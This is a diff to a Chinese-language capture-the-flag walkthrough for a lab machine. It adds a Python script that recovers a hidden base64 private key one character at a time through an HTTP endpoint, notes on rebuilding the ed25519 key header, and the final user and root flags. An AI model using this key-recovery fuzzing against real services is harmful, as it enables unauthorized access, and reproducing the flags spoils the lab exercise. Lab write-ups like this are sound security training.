@@ -163,9 +163,78 @@ Nmap done: 1 IP address (1 host up) scanned in 46.00 seconds
 
 ![picture 36](../assets/images/cdb6c014a680f4447dc8fdde598b1aba91100e41825c81c44188e12adfefec3c.png)  
 
+![picture 37](../assets/images/8789a972c72221f6ecb649bc1a225271ed964f966dfdd89ac7a586197b21692c.png)  
+![picture 38](../assets/images/391b482067e563b1fe4f737d8124981871cda2dcfdf8d6db307d857baf353f9f.png)  
 
-
->userflag:
+>这玩意我获得提示是fuzz base64
 >
->rootflag:
+
+![picture 39](../assets/images/0bee522e199f1929cf380290bb22cb3dcfb91947c300c39da33dfa587a334a37.png)  
+
+>有点头疼就一行
+>
+
+![picture 40](../assets/images/7bd919ab901e4e68e8d201c9242b38d1f9ed90f4dd8caa06f407590de9402076.png)  
+
+>对我来说1-5手动吧
+>
+
+```
+import requests
+import sys
+
+# 读取base64字符集（注意修复原脚本文件名中的空格）
+base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
+
+key = ""
+for _ in range(70):     # 中层循环70次
+    found = False
+    for char in base64_chars:  # 内层遍历字符
+        temp = key + char
+        try:
+            # 发送请求（注意原脚本curl参数拼写错误）
+            response = requests.get(f"http://192.168.137.75:8000/line5/{temp}",timeout=2)
+            a = response.text
+        except Exception as e:
+            a = ""
+            
+            # 原脚本的逆向逻辑可能需要调整（详见说明）
+        if not a:  # 对应原脚本的 [ -z "$a" ]
+            key = temp
+            found = True
+            break  # 跳出字符循环
+        
+    if not found:  # 本轮未找到有效字符
+        break      # 提前结束中层循环
+
+print("Final key:", key)
+```
+
+>然后随便匹配一下
+>
+
+![picture 41](../assets/images/ccbda7f45ded42518ddfa98799ae33fc25055138ab4ad1ebc5c84f4c45fa856e.png)  
+
+>但是没头我还得找他的头我记得这个作者喜欢ed25519
+>
+
+![picture 42](../assets/images/7cef2a0e313087985428f8ef87fdb6528cced34ba3da95dab609bf7a9e4a7372.png)  
+
+>我直接把内容放进去就好了
+>
+
+![picture 43](../assets/images/4975d4e597278624d16debe28cb2d740845cb50fdcadec650315772a1d3a9f4f.png)  
+![picture 44](../assets/images/4ad6f41578c107726ecb7780669f1899a8d20f0b1f3705344e5490a34cd7790a.png)  
+
+
+![picture 46](../assets/images/bae5b8898838071e1a9cccf3b4a94d9902df47f77e3697b3501444e84fa5d7a3.png)  
+
+![picture 45](../assets/images/9b789d682ee02017770ae4e119dad05d640fca5f1f50bc89b34a4597c0b8f067.png)  
+
+>结束了
+>
+
+>userflag:flag{da39a3ee5e6b4b0d3255bfef95601890afd80709}
+>
+>rootflag:flag{46a0e055d5db8d82eee6e7eb3ee3ccf64be3fca2}
 >
